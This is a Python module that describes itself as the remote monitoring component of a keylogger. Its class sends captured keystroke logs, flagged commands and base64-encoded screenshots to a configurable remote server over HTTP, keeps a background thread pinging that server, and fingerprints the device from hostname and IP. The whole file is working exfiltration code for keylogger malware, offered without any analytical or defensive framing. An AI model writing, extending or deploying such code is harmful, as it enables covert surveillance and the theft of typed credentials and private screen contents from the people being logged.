"""
Remote monitoring module for the keylogger
Provides capabilities to send logs and notifications to a remote server
"""

import socket
import json
import base64
import threading
import time
import os
import requests
from datetime import datetime
import hashlib

class RemoteMonitor:
    def __init__(self, callback=None):
        """
        Initialize the remote monitoring module
        
        Args:
            callback: Function to call when remote events occur
        """
        self.callback = callback
        self.running = False
        self.server_url = "http://localhost:5000"  # Default to localhost for testing
        self.remote_enabled = False
        self.connection_status = "Disconnected"
        self.sync_interval = 60  # Seconds between syncs
        self.api_key = ""
        self.device_id = self._generate_device_id()
        self.last_sync_time = None
        self.sync_thread = None
        
    def start(self):
        """Start the remote monitoring service"""
        if not self.remote_enabled or self.running:
            return False
            
        self.running = True
        
        # Start the sync thread
        self.sync_thread = threading.Thread(target=self._sync_loop)
        self.sync_thread.daemon = True
        self.sync_thread.start()
        
        self.connection_status = "Connecting..."
        if self.callback:
            self.callback("status_update", self.connection_status)
            
        return True
        
    def stop(self):
        """Stop the remote monitoring service"""
        self.running = False
        self.connection_status = "Disconnected"
        
        if self.callback:
            self.callback("status_update", self.connection_status)
        
    def set_server_url(self, url):
        """Set the server URL"""
        self.server_url = url
        return True
        
    def set_api_key(self, key):
        """Set the API key for authentication"""
        self.api_key = key
        return True
        
    def set_sync_interval(self, interval):
        """Set the synchronization interval in seconds"""
        try:
            interval = int(interval)
            if interval < 10:  # Minimum 10 seconds
                interval = 10
            self.sync_interval = interval
            return True
        except:
            return False
            
    def enable(self, enable=True):
        """Enable or disable remote monitoring"""
        self.remote_enabled = enable
        
        if enable and not self.running:
            return self.start()
        elif not enable and self.running:
            self.stop()
            
        return True
        
    def get_status(self):
        """Get the current status of remote monitoring"""
        return {
            "enabled": self.remote_enabled,
            "running": self.running,
            "status": self.connection_status,
            "server": self.server_url,
            "device_id": self.device_id,
            "last_sync": self.last_sync_time,
            "sync_interval": self.sync_interval
        }
        
    def send_log(self, log_data):
        """
        Send log data to the remote server
        
        Args:
            log_data: The log data to send
            
        Returns:
            bool: True if successful, False otherwise
        """
        if not self.remote_enabled or not self.running:
            return False
            
        try:
            # Prepare the data
            data = {
                "type": "log",
                "device_id": self.device_id,
                "timestamp": datetime.now().isoformat(),
                "data": log_data
            }
            
            # Send the data
            return self._send_data(data)
        except Exception as e:
            self.connection_status = f"Error: {str(e)}"
            if self.callback:
                self.callback("status_update", self.connection_status)
            return False
            
    def send_flag(self, flag_data):
        """
        Send flagged command data to the remote server
        
        Args:
            flag_data: The flagged command data to send
            
        Returns:
            bool: True if successful, False otherwise
        """
        if not self.remote_enabled or not self.running:
            return False
            
        try:
            # Prepare the data
            data = {
                "type": "flag",
                "device_id": self.device_id,
                "timestamp": datetime.now().isoformat(),
                "data": flag_data
            }
            
            # Send the data
            return self._send_data(data)
        except Exception as e:
            self.connection_status = f"Error: {str(e)}"
            if self.callback:
                self.callback("status_update", self.connection_status)
            return False
            
    def send_screenshot(self, screenshot_data, related_flag=None):
        """
        Send screenshot data to the remote server
        
        Args:
            screenshot_data: The screenshot data (bytes)
            related_flag: Optional related flag information
            
        Returns:
            bool: True if successful, False otherwise
        """
        if not self.remote_enabled or not self.running:
            return False
            
        try:
            # Encode the screenshot
            encoded_image = base64.b64encode(screenshot_data).decode('utf-8')
            
            # Prepare the data
            data = {
                "type": "screenshot",
                "device_id": self.device_id,
                "timestamp": datetime.now().isoformat(),
                "image": encoded_image,
                "related_flag": related_flag
            }
            
            # Send the data
            return self._send_data(data)
        except Exception as e:
            self.connection_status = f"Error: {str(e)}"
            if self.callback:
                self.callback("status_update", self.connection_status)
            return False
    
    def _send_data(self, data):
        """
        Send data to the remote server
        
        Args:
            data: The data to send
            
        Returns:
            bool: True if successful, False otherwise
        """
        try:
            # Add authentication
            headers = {
                "Content-Type": "application/json",
                "X-API-Key": self.api_key,
                "X-Device-ID": self.device_id
            }
            
            # Send the data
            response = requests.post(
                f"{self.server_url}/api/data",
                json=data,
                headers=headers,
                timeout=5  # 5 seconds timeout
            )
            
            # Check the response
            if response.status_code == 200:
                self.connection_status = "Connected"
                self.last_sync_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                
                if self.callback:
                    self.callback("status_update", self.connection_status)
                    
                return True
            else:
                self.connection_status = f"Error: Server returned {response.status_code}"
                
                if self.callback:
                    self.callback("status_update", self.connection_status)
                    
                return False
                
        except requests.exceptions.ConnectionError:
            self.connection_status = "Error: Connection failed"
        except requests.exceptions.Timeout:
            self.connection_status = "Error: Connection timeout"
        except Exception as e:
            self.connection_status = f"Error: {str(e)}"
            
        if self.callback:
            self.callback("status_update", self.connection_status)
            
        return False
        
    def _sync_loop(self):
        """Background thread for periodic synchronization"""
        while self.running:
            # Try to ping the server
            try:
                # Make a simple request to verify connection
                response = requests.get(
                    f"{self.server_url}/api/ping",
                    headers={
                        "X-API-Key": self.api_key,
                        "X-Device-ID": self.device_id
                    },
                    timeout=5
                )
                
                if response.status_code == 200:
                    self.connection_status = "Connected"
                else:
                    self.connection_status = f"Error: Server returned {response.status_code}"
                    
            except requests.exceptions.ConnectionError:
                self.connection_status = "Error: Connection failed"
            except requests.exceptions.Timeout:
                self.connection_status = "Error: Connection timeout"
            except Exception as e:
                self.connection_status = f"Error: {str(e)}"
                
            # Update status
            if self.callback:
                self.callback("status_update", self.connection_status)
                
            # Sleep for the sync interval
            for _ in range(self.sync_interval):
                if not self.running:
                    break
                time.sleep(1)
                
    def _generate_device_id(self):
        """Generate a unique device ID"""
        try:
            # Get hardware information
            hostname = socket.gethostname()
            ip_addr = socket.gethostbyname(hostname)
            
            # Create a unique identifier
            identifier = f"{hostname}:{ip_addr}"
            hashed = hashlib.md5(identifier.encode()).hexdigest()
            
            return hashed
        except:
            # Fallback to a random ID if hardware info is unavailable
            import random
            return f"device_{random.randint(10000, 99999)}"